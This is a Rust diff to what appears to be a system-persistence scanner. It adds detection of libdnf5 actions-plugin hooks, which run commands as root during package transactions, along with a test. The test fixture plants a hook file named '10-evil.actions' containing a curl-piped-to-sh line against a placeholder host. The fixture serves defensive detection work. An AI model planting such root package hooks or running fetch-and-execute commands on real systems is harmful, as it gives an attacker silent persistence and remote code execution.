@@ -33,6 +33,7 @@ impl Collector for PkgHooks {
         let mut out = apt(cx);
         out.extend(dpkg_scripts(cx));
         out.extend(dnf_plugins(cx));
+        out.extend(libdnf5_actions(cx));
         out.extend(rpm(cx));
         out.extend(kernel_hooks(cx));
         out.extend(dpkg_cfg(cx));
@@ -670,8 +671,70 @@ const PLUGIN_DIRS: &[(&str, &str, &str)] = &[
     // dnf5 is the default on current Fedora and keeps its plugin settings
     // somewhere else; its plugins are shared objects rather than python.
     ("etc/dnf/dnf5-plugins", "dnf5", "etc/dnf/dnf.conf"),
+    // libdnf5's own plugins, loaded into every program using the library
+    // (dnf5 and PackageKit among them); the actions plugin runs commands at
+    // transaction hooks from its actions.d.
+    ("etc/dnf/libdnf5-plugins", "libdnf5", "etc/dnf/dnf.conf"),
     ("etc/yum/pluginconf.d", "yum", "etc/yum.conf"),
 ];
+
+/// The actions of libdnf5's actions plugin (libdnf5-plugin-actions(8)):
+/// each `.actions` file in actions.d, in name order, each non-comment line
+/// `callback:package_filter:direction:options:command`, the command run as
+/// root by whatever uses libdnf5 when that callback fires (pre_base_setup,
+/// repos_configured, pre_transaction, post_transaction and the rest), once
+/// per matching package where the filter is set.
+fn libdnf5_actions(cx: &mut Ctx) -> Vec<Entry> {
+    let dir = Path::new("etc/dnf/libdnf5-plugins/actions.d");
+    let mut names: Vec<_> = cx.dir(dir).into_iter().filter(|e| !e.is_dir && e.name.as_bytes().ends_with(b".actions")).map(|e| e.name).collect();
+    names.sort();
+    if names.is_empty() {
+        return Vec::new();
+    }
+    let plugin_on = cx.read("etc/dnf/libdnf5-plugins/actions.conf").and_then(|b| ini_lookup(&b, "main", "enabled")).and_then(|v| as_bool(&v)) == Some(true);
+    let code = ["usr/lib64/libdnf5/plugins/actions.so", "usr/lib/libdnf5/plugins/actions.so"].iter().find(|p| cx.root.exists(p)).map(|p| cx.root.abs(p));
+    let mut out = Vec::new();
+    for n in names {
+        let rel = dir.join(&n);
+        let Some(bytes) = cx.read(&rel) else { continue };
+        let file = lossy(n.as_bytes());
+        for (i, line) in String::from_utf8_lossy(&bytes).lines().enumerate() {
+            let t = line.trim();
+            if t.is_empty() || t.starts_with('#') {
+                continue;
+            }
+            let f: Vec<&str> = t.splitn(5, ':').collect();
+            if f.len() < 5 {
+                continue;
+            }
+            let mut e = cx.entry(Kind::PkgHook, &rel, format!("libdnf5-actions:{file}:{}:{}", f[0], i + 1));
+            e.trigger = Trigger::PackageOp;
+            e.principal = Some("root".to_string());
+            e.note("manager", "libdnf5");
+            e.note("callback", f[0]);
+            if !f[1].is_empty() {
+                e.note("package_filter", f[1]);
+            }
+            if !f[2].is_empty() {
+                e.note("direction", f[2]);
+            }
+            if !f[3].is_empty() {
+                e.note("options", f[3]);
+            }
+            e.command = Some(f[4].as_bytes().to_vec());
+            e.enabled = Enablement::Enabled;
+            if !plugin_on {
+                e.enabled = Enablement::Disabled;
+                e.note("not_run", "the actions plugin is not enabled in actions.conf");
+            } else if code.is_none() {
+                e.enabled = Enablement::Disabled;
+                e.note("not_run", "libdnf5-plugin-actions is not installed");
+            }
+            out.push(e);
+        }
+    }
+    out
+}
 
 fn dnf_plugins(cx: &mut Ctx) -> Vec<Entry> {
     // etc/dnf/protected.d holds package names that may not be removed. It
@@ -765,6 +828,11 @@ fn plugin_code(cx: &Ctx, pythons: &[PathBuf], manager: &str, plugin: &str) -> Op
         "dnf5" => {
             for lib in ["usr/lib64", "usr/lib"] {
                 candidates.push(PathBuf::from(format!("{lib}/dnf5/plugins/{plugin}.so")));
+            }
+        }
+        "libdnf5" => {
+            for lib in ["usr/lib64", "usr/lib"] {
+                candidates.push(PathBuf::from(format!("{lib}/libdnf5/plugins/{plugin}.so")));
             }
         }
         "yum" => {
@@ -2181,6 +2249,38 @@ mod tests {
         let div: Vec<&Entry> = s.entries.iter().filter(|e| e.kind == Kind::DpkgDiversion).collect();
         assert_eq!(div.len(), 1, "a package's own diversion is not reported");
         assert_eq!(div[0].raw["diverted_to"], "/usr/sbin/sshd.real");
+        std::fs::remove_dir_all(&d).unwrap();
+    }
+    #[test]
+    fn libdnf5_plugins_and_actions_are_package_hooks() {
+        let d = std::env::temp_dir().join(format!("unbidden-libdnf5-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&d);
+        let put = |rel: &str, body: &[u8]| {
+            let p = d.join(rel);
+            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
+            std::fs::write(p, body).unwrap();
+        };
+        put("etc/dnf/dnf.conf", b"[main]\n");
+        put("etc/dnf/libdnf5-plugins/actions.conf", b"[main]\nname = actions\nenabled = 1\n");
+        put("usr/lib64/libdnf5/plugins/actions.so", b"\x7fELF");
+        put("etc/dnf/libdnf5-plugins/actions.d/10-evil.actions", b"# c\npost_transaction:*:in::/opt/notify ${pkg.name}\nrepos_configured::::/usr/bin/curl -s http://x.invalid | sh\nbroken line\n");
+        put("etc/dnf/libdnf5-plugins/actions.d/notes.txt", b"post_transaction::::/never\n");
+        let root = crate::root::Root::at(&d).unwrap();
+        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(PkgHooks)];
+        let s = crate::scan::run(&root, &crate::scan::Options { deep: false }, &collectors);
+        let mut got: Vec<(&str, &str, Enablement)> = s.entries.iter().map(|e| (e.name.as_str(), e.command.as_deref().map(|c| std::str::from_utf8(c).unwrap()).unwrap_or("-"), e.enabled)).collect();
+        got.sort();
+        assert_eq!(
+            got,
+            [
+                ("libdnf5-actions:10-evil.actions:post_transaction:2", "/opt/notify ${pkg.name}", Enablement::Enabled),
+                ("libdnf5-actions:10-evil.actions:repos_configured:3", "/usr/bin/curl -s http://x.invalid | sh", Enablement::Enabled),
+                ("libdnf5-plugin:actions", "-", Enablement::Enabled),
+            ],
+            "only .actions files, only five-field lines"
+        );
+        let plugin = s.entries.iter().find(|e| e.name == "libdnf5-plugin:actions").unwrap();
+        assert_eq!(plugin.target_path.as_deref(), Some(d.join("usr/lib64/libdnf5/plugins/actions.so").as_path()));
         std::fs::remove_dir_all(&d).unwrap();
     }
 }
